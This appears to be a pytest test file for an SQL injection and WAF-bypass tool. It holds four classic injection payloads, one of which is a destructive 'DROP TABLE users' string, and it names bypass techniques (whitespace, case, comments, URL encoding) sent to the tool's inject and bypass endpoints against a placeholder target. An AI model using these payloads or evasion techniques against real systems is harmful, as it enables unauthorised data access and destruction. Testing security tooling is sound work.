import pytest
from fastapi.testclient import TestClient
from server.main import app

client = TestClient(app)

def test_sql_injection_payload_effectiveness():
    """Test injection endpoint with common SQL injection payloads"""
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' AND SLEEP(5)--"
    ]
    for payload in payloads:
        data = {
            "target": "http://example.com/vulnerable.php",
            "payload": payload,
            "technique": "BLIND",
            "options": {}
        }
        response = client.post("/api/v1/inject", json=data)
        assert response.status_code == 200
        json_resp = response.json()
        assert json_resp.get("success") is True
        assert "data" in json_resp

def test_waf_bypass_techniques():
    """Test WAF bypass endpoint with various techniques"""
    data = {
        "payload": "SELECT * FROM users",
        "techniques": ["whitespace", "case", "comments", "url_encode"]
    }
    response = client.post("/api/v1/bypass", json=data)
    assert response.status_code == 200
    json_resp = response.json()
    assert json_resp.get("success") is True
    assert isinstance(json_resp.get("results"), list)
    assert len(json_resp.get("results")) == len(data["techniques"])
